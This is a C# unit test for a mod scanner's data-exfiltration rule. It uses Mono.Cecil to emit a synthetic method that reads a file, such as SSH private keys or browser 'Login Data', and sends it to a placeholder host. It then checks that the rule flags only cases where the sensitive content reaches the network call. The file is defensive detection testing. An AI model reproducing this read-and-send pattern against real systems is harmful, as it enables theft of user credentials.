using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.Rules;
using MLVScan.Services;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class ExfiltrationEvasionTests
{
    [Theory]
    [InlineData(false, "C:/Users/test/.ssh/id_rsa", true, true)]
    [InlineData(true, "C:/Users/test/.ssh/id_ed25519", true, true)]
    [InlineData(false, "C:/Users/test/Browser/Login Data", true, true)]
    [InlineData(true, "C:/game/config/settings.json", true, false)]
    [InlineData(false, "C:/game/config/settings.json", true, false)]
    [InlineData(false, "C:/Users/test/.ssh/id_rsa", false, false)]
    [InlineData(true, "C:/Users/test/.ssh/id_ed25519", false, false)]
    public void SensitiveContent_RequiresSourceToReachNetworkSink(bool requestStream, string path, bool useContent, bool expected)
    {
        using var module = ModuleDefinition.CreateModule("OutboundData", ModuleKind.Dll);
        var type = new TypeDefinition("Probe", "Sender", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);
        var method = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        type.Methods.Add(method);
        var il = method.Body.GetILProcessor();
        var unity = new TypeReference("UnityEngine.Networking", "UnityWebRequest", module, module.TypeSystem.CoreLibrary);
        var post = new MethodReference("Post", unity, unity);
        post.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
        post.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));

        il.Emit(OpCodes.Ldstr, "https://example.org/collect");
        if (requestStream)
        {
            il.Emit(OpCodes.Call, module.ImportReference(typeof(System.Net.WebRequest).GetMethod("Create", [typeof(string)])!));
            il.Emit(OpCodes.Callvirt, module.ImportReference(typeof(System.Net.WebRequest).GetMethod("GetRequestStream", Type.EmptyTypes)!));
            il.Emit(OpCodes.Call, module.ImportReference(typeof(System.Text.Encoding).GetProperty("UTF8")!.GetMethod!));
        }
        il.Emit(OpCodes.Ldstr, path);
        il.Emit(OpCodes.Call, module.ImportReference(typeof(File).GetMethod("ReadAllText", [typeof(string)])!));
        if (!useContent)
        {
            il.Emit(OpCodes.Pop);
            il.Emit(OpCodes.Ldstr, "constant report");
        }
        if (requestStream)
        {
            il.Emit(OpCodes.Callvirt, module.ImportReference(typeof(System.Text.Encoding).GetMethod("GetBytes", [typeof(string)])!));
            il.Emit(OpCodes.Ldc_I4_0);
            il.Emit(OpCodes.Ldc_I4_1);
            il.Emit(OpCodes.Callvirt, module.ImportReference(typeof(Stream).GetMethod("Write", [typeof(byte[]), typeof(int), typeof(int)])!));
        }
        else
        {
            il.Emit(OpCodes.Call, post);
            il.Emit(OpCodes.Pop);
        }
        il.Emit(OpCodes.Ret);

        var findings = new DataExfiltrationRule().AnalyzeInstructions(method, method.Body.Instructions, new MethodSignals()).ToList();
        findings.Any().Should().Be(expected);
        ScanResultMapper.ToDto(findings, "probe.dll", [], false).Disposition!.Classification
            .Should().Be(expected ? "Suspicious" : "Clean");
    }
}
